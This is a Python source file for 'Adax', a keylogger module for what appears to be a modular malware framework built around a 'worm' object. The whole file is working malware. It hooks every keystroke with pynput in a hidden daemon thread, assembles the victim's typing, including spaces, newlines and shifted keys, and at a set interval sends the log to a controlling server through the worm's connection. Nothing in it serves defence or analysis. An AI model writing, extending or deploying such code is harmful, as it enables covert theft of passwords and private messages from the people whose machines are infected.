#!name##Adax
#!types##module
#!info##A simple keylogger. Records the victim's keystrokes and sends to the server.
#!reqVar##ADAX_time##Time interval when sending logs.##int
#!setVar##ADAX_time##30##int
#!system_FLAG##[W]


from pynput import keyboard
from threading import Thread
from time import sleep


class Adax:
    MTYPES = "mal"
    def __init__(self, worm: object):
        self.worm = worm
        self.pressed = ""
        self.time_pause = {{ADAX_time}}
        self.work = False

    
    def pressed_key(self, key) -> None:
        try:
            click = key.char
        except:
            click = str(key)
        if click == "Key.space":
            self.pressed += " "
        elif click == "Key.enter":
            self.pressed += "\n"
        elif click.startswith("Key.shift"):
            self.pressed += click[9:].upper()
        else:
            self.pressed += click
       

    
    def _listener(self) -> None:
        with keyboard.Listener(on_press=self.pressed_key) as listener:
            listener.join()

    def listener(self) -> None:
        listener = Thread(target=self._listener, daemon=True)
        listener.start()
    
    def send_logs(self) -> None:
        data = {"types" : "keyl", "data" : self.pressed}
        if self.worm.is_conn:
            self.worm.send_data(data)
            self.pressed = ""
    
    def help(self) -> str:
        h = f"\n{'adax_start':<25}Start Keylogger\n"
        h += f"{'adax_stop':<25}Stop Keylogger\n"
        return h
        
    
    def start(self) -> None:
        self.work = True
        self.listener()
        while self.work:
            sleep(self.time_pause)
            self.send_logs()

        





